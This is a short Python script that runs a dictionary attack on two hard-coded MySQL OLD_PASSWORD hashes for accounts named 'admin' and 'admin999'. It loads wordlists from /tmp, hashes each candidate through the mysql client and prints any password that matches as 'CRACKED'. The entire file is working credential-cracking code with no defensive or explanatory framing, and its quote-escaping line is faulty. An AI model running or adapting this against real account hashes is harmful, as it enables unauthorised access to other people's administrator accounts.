import subprocess
import os

targets = [
    ('admin', '2d9d5942943a1323'),
    ('admin999', '79dca16741891333'),
]

passwords = set()
for f in ['/tmp/bj_uniq.txt', '/tmp/big_dict.txt', '/tmp/big_pass.txt', '/tmp/bj_pass.txt']:
    if os.path.exists(f):
        with open(f, 'r', errors='ignore') as fh:
            for line in fh:
                p = line.strip()
                if p:
                    passwords.add(p)

passwords = sorted(passwords)
print('Loaded ' + str(len(passwords)) + ' unique passwords')

# MySQL OLD_PASSWORD
print('\n=== MySQL OLD_PASSWORD ===')
count = 0
for pw in passwords:
    pw_esc = pw.replace("'", "\'")
    result = subprocess.run(
        ['mysql', '-B', '-N', '-e', "SELECT OLD_PASSWORD('" + pw_esc + "')"],
        capture_output=True, text=True, timeout=5
    )
    h = result.stdout.strip()
    count += 1
    if count % 200 == 0:
        print('  checked ' + str(count) + '...')
    for user, target in targets:
        if h == target:
            print('*** CRACKED *** ' + user + ': ' + pw + ' -> ' + h)
print('  checked ' + str(count) + ' total')

print('\nDone.')
